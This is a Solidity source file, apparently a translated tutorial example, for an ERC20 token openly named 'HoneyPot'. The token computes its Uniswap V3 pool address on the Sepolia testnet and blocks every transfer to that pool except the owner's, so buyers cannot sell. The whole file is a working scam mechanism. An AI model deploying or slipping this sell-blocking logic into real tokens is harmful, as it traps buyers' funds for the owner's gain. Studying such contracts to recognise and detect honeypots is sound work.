// SPDX-License-Identifier: MIT
// english translation by 22X
pragma solidity ^0.8.21;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

// Simple Honeypot ERC20 token, can only be bought, not sold
contract HoneyPot is ERC20, Ownable {
    address public pool;
    uint24 private constant poolFee = 3000; // 0.3% fee tier

    // Constructor: Initialize token name and symbol
    constructor() ERC20("HoneyPot", "Pi Xiu") Ownable(msg.sender) {
        address factory = 0x0227628f3F023bb0B980b67D528571c95c6DaC1c; // Uniswap V3 factory on Sepolia
        address tokenA = address(this); // Honeypot token address
        address tokenB = 0xfFf9976782d46CC05630D1f6eBAb18b2324d6B14; // Sepolia WETH
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA); // Sort tokenA and tokenB in ascending order
        bytes32 salt = keccak256(abi.encodePacked(token0, token1, poolFee));
        // calculate pool address
        pool = address(uint160(uint256(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            salt,
            bytes32(0xe34f199b19b2b4f47f68442619d555527d244f78a3297ea89325f843f87b8b54) // Uniswap V3 pool initcode hash
        )))));
    }

    /**
     * Mint function, can only be called by the contract owner
     */
    function mint(address to, uint amount) public onlyOwner {
        _mint(to, amount);
    }

    /**
     * @dev See {ERC20-_update}.
     * Honeypot function: Only the contract owner can sell
     */
    function _update(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        // Revert if the transfer target address is the pool contract
        if(to == pool){
            require(from == owner(), "Can not Transfer");
        }
        super._update(from, to, amount);
    }
}
